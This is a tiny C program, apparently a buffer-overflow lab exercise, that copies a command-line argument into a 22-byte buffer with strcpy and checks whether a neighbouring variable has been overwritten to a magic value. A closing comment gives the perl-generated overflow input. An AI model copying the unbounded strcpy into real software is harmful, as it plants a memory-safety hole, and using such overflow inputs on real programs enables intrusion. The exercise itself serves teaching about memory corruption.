#include <stdio.h>
#include <string.h>

int main(int argc, char const *argv[])
{
    int canary = 20;
    char buf[22];

    strcpy(buf,argv[1]);

    if(canary == 0x08010205)
        printf("Sucess\n");
    return 0;
    //./bo2 `perl -e 'print "A"x22, "\x05\x02\x01\x08"'`
}
